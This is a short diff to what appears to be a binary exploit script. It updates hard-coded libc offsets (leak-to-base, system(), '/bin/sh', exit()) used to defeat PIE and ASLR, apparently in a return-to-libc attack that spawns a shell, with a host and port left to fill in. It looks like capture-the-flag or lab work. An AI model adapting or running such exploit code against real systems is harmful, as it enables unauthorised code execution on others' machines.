@@ -5,11 +5,11 @@ import sys
 # these will need to be altered depending on the libc version
 # 
 BASE  = 0x73c     # offset from leak to binary base (to overcome PIE)
-LIBC  = 0x70e1d   # offset from libc leak to libc base (to overcome ASLR)
+LIBC  = 0x7058b   # offset from libc leak to libc base (to overcome ASLR)
 
-SYS   = 0x3d200   # offset from libc base to system()
-BINSH = 0x17e0cf  # offset from libc base to /bin/sh
-EXIT  = 0x0303d0  # offset from libc base to exit()
+SYS   = 0x03cd10  # offset from libc base to system()
+BINSH = 0x17b8cf  # offset from libc base to /bin/sh
+EXIT  = 0x02ff70  # offset from libc base to exit()
 
 HOST  = ''
 PORT  = 12345
